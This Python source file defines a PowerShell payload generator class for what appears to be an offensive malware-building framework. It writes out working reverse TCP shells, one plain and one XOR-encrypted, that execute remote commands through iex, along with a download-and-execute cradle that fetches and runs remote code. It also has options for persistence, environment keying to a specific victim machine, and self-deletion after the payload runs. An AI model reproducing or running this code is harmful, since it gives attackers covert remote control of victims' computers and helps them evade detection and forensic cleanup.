# powershell payload generator
# supports encrypted streams, persistence, and self-deletion

import random
from generators.base import BaseGenerator


class PowerShellGenerator(BaseGenerator):
    LANG_ID = "ps1"
    LANG_NAME = "PowerShell"
    FILE_EXT = ".ps1"

    def generate(self, host, port, opts, ptype, tpl, adv):
        melt = adv.get("melt", False)
        persist = adv.get("persist", "none")
        encrypt = adv.get("encrypt", False)

        code = ""

        if adv.get("sleep"):
            code += f"Start-Sleep -Seconds {adv['sleep']}\n"

        # environment keying - only run on the right box
        if adv.get("env_key"):
            code += f"if ($env:COMPUTERNAME -ne '{adv['env_key']}' -and $env:USERNAME -ne '{adv['env_key']}') {{ exit }}\n"

        # install persistence
        if persist != "none":
            code += self.persist_ps1(persist) + "\n"

        if ptype == "reverse_tcp":
            if encrypt:
                key = random.randint(1, 255)
                code += (
                    f"$c = New-Object System.Net.Sockets.TCPClient('{host}',{port});$s = $c.GetStream();"
                    f"function _x($d, $k) {{ $o = New-Object byte[] $d.Length; for($i=0; $i -lt $d.Length; $i++) {{ $o[$i] = $d[$i] -bxor $k }}; return $o }};"
                    f"while(($i = $s.Read(($b = New-Object byte[] 4096), 0, 4096)) -ne 0) {{ "
                    f"$d = [System.Text.Encoding]::ASCII.GetString(_x($b[0..($i-1)], {key})).Trim(); "
                    f"if($d -eq 'exit') {{ break }}; $o = (iex $d 2>&1 | Out-String); "
                    f"$x = _x([System.Text.Encoding]::ASCII.GetBytes($o + \"`nPS \"), {key}); $s.Write($x, 0, $x.Length) }}; $c.Close()"
                )
            else:
                code += f"$c = New-Object System.Net.Sockets.TCPClient('{host}',{port});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$o = (iex $d 2>&1 | Out-String );$t  = $o + 'PS ' + (pwd).Path + '> ';$x = ([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()}};$c.Close()"

        elif ptype in ("ps_dl_exec", "cmd_one_liner"):
            code += f"IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/p')"
        else:
            code += "# no ps1 implementation for this type yet"

        # wipe the script after running
        if melt:
            code += "\nRemove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue\n"

        return code
